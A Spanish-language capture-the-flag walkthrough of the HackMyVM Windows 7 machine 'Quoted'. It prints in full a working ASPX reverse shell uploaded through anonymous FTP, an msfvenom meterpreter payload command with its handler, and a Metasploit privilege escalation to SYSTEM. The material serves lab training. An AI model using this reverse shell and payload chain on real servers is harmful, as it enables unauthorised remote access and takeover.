
#hacking #HackMyVM #windows #metasploit #msfvenom 

```php 
#################################################################################
#
# CTF a la Máquina Quoted
#
# DATE: 08/Enero/2025
#
#################################################################################
```

# Footprinting

```bash 
IP_atacante -> $ifconfig -> 192.168.0.19
IP_objetivo -> $sudo netdiscover -r 192.168.0.0/24 -c 200 -> 192.168.0.139
```

# Escaneo y Enumeración

Veo qué puertos tiene abiertos

```php 
nmap -sVC -T5 -n -p- 192.168.0.139
```

Obtengo:

```php 
PORT   STATE SERVICE VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-05-24  11:16AM       <DIR>          aspnet_client
| 10-04-24  11:27PM                  689 iisstart.htm
|_10-04-24  11:27PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:66:49:3E (Oracle VirtualBox virtual NIC)
Service Info: Host: QUOTED-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: quoted-PC
|   NetBIOS computer name: QUOTED-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-07T18:50:31+02:00
|_nbstat: NetBIOS name: QUOTED-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08002766493e (Oracle VirtualBox virtual NIC)
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-07T16:50:31
|_  start_date: 2025-01-07T16:47:40
```

Compruebo si samba tiene alguna vulnerabilidad. Pero **no la tiene**

```bash
# Para saber posibles vuln de samba
sudo nmap --script "safe or smb-enum-*" -p 445 192.168.0.139 -Pn
```

En el ftp anónimo me descargo un fichero htm, que no tiene nada y una imagen. Lo tengo que bajar en modo *binary* para que no de error. El comando es `binary` dentro del ftp.

Al cargar la web, me doy cuenta que lo que ejecuta es lo que tengo en el ftp anónimo. Pruebo con un fichero simple en html, lo subo con *put* en el ftp y lo visualizo con el navegador. Funciona.

# Acceso

Normalmente un servidor IIS interpreta código en ASP o ASPX. Lo intenté con PHP pero sin éxito, sin embargo al probar un fragmento simple en ASP funcionó

```asp
<% 
Response.Write("Hola desde ASP clasico!")
%>
```

Encontré en github una rshell en ASPX https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx, que modifiqué con mi IP y puerto

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
	protected void Page_Load(object sender, EventArgs e)
    {
	    String host = "192.168.0.19"; //CHANGE THIS
            int port = 8888; ////CHANGE THIS
                
        CallbackShell(host, port);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }
    
    
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;
    
    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;
    
    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo, 
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);   

    
   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }

   
   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);

   

   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
       IntPtr pSid,
       StringBuilder Account,
       ref int cbName,
       StringBuilder DomainName,
       ref int cbDomainName,
       ref int peUse 

   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,									
        uint dwOpenMode,								
        uint dwPipeMode,								
        uint nMaxInstances,							
        uint nOutBufferSize,						
        uint nInBufferSize,							
        uint nDefaultTimeOut,						
        IntPtr pipeSecurityDescriptor
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,
        uint lpOverlapped
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );
 
    protected void CallbackShell(string server, int port)
    {

        string request = "Spawn Shell...\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;
        
        sockaddr_in socketinfo;
        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
        socketinfo = new sockaddr_in();
        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
        socketinfo.sin_addr = inet_addr(server);
        socketinfo.sin_port = (short) htons((ushort)port);
        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
        send(oursocket, bytesSent, request.Length, 0);
        SpawnProcessAsPriv(oursocket);
        closesocket(oursocket);
    }

    protected void SpawnProcess(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
    }

    protected void SpawnProcessAsPriv(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101; 
        IntPtr DupeToken = new IntPtr(0);
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        if (DupeToken == IntPtr.Zero)
            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        else
            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
        CloseHandle(DupeToken);
    }
    </script>
```

Puse un netcat para escuchar en ese puerto. 

```zsh
nc -lvnp 8888
```


Lo subí al ftp anónimo y lo ejecuté con el navegador y obtuve acceso.

```console
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>

```

Con ese usuario he podido obtener la bandera de usuario

```console
c:\Users\quoted\Desktop>type user.txt
type user.txt
HMV{}
```


# Elevación a Root

Ese usuario no tiene privilegios para obtener la bandera de `administrator` así que verifico el sistema operativo en el que estoy con el comando `systeminfo` . Veo que es un windows 7 SP1, que tendrá vulnerabilidades.

Vamos a intentar crear una sesión, con metasploit y averiguar que vulns tiene.

1. Me creo un ejecutable envenenado con un meterpreter

```zsh
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.19 LPORT=6666 -f exe -o reverse.exe
```

2. Lo subo al servidor con el ftp anónimo. Es muy importante que antes lo cambie a `binary`porque de otra manera el ejecutable no funcionaría. Y lo ejecuto:

```zsh
c:\inetpub\wwwroot>reverse.exe
reverse.exe
```

3. Pongo un listener con metasploit en mi máquina de ataque

```zsh
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 6666; set ExitOnSession false; set AutoRunScript post/windows/manage/migrate; run -z -j"
```

Y al cabo de un rato ya tengo la conexión en la session 1:

```zsh
❯ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 6666; set ExitOnSession false; set AutoRunScript post/windows/manage/migrate; run -z -j"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
LHOST => 0.0.0.0
LPORT => 6666
ExitOnSession => false
AutoRunScript => post/windows/manage/migrate
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:6666 
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> [*] Session ID 1 (192.168.0.19:6666 -> 192.168.0.139:49160) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against QUOTED-PC
[*] Current server process: reverse.exe (2004)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 1804
[+] Successfully migrated into process 1804
[*] Meterpreter session 1 opened (192.168.0.19:6666 -> 192.168.0.139:49160) at 2025-01-08 20:57:10 +0100

[msf](Jobs:1 Agents:1) exploit(multi/handler) >> show sessions

Active sessions
===============

  Id  Name  Type                     Information                               Connection
  --  ----  ----                     -----------                               ----------
  1         meterpreter x64/windows  NT AUTHORITY\NETWORK SERVICE @ QUOTED-PC  192.168.0.19:6666 -> 192.168.0.139:49160 (192.168.0.139)

[msf](Jobs:1 Agents:1) exploit(multi/handler) >> sessions 1
[*] Starting interaction with 1...

(Meterpreter 1)(c:\inetpub\wwwroot) > 
```


### Buscando vulns con metasploit con una sesión abierta

Como tengo la sesión 1 abierta, con un meterpreter, tengo que ejecutar el comando **background**  para no cerrar dicha sesión.

Ejecuto el comando msf, `search local suggest`

```msf
[msf](Jobs:1 Agents:1) exploit(multi/handler) >> search local suggest
```

Y entre los dos que me da, elijo el primero, ` 0  post/multi/recon/local_exploit_suggester `

```msf
[msf](Jobs:1 Agents:1) exploit(multi/handler) >> use 0
[msf](Jobs:1 Agents:1) post(multi/recon/local_exploit_suggester) >> 
```

Con `show options` veo las opciones del módulo y me requiere una sesión, que en mi caso es la `1` que tenía en background y ejecuto con `run`

Me va a dar una serie de probables exploits que pueden funcionar para las vulns que tiene el sistema.

Este parece que funciona:

```msf
11  exploit/windows/local/ms16_075_reflection_juicy 
```

Lo selecciono:

```msf
[msf](Jobs:1 Agents:1) post(multi/recon/local_exploit_suggester) >> use exploit/windows/local/ms16_075_reflection_juicy
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:1 Agents:1) exploit(windows/local/ms16_075_reflection_juicy) >> 
```

Le configuro en sus opciones la sesión `1` y lo ejecuto con `run` obteniendo un meterpreter con privilegios de `SYSTEM`

```zsh
(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

Y a partir de aquí obtengo bandera:

```console
(Meterpreter 2)(C:\users\administrator\desktop) > cat root.txt
HMV{}
```
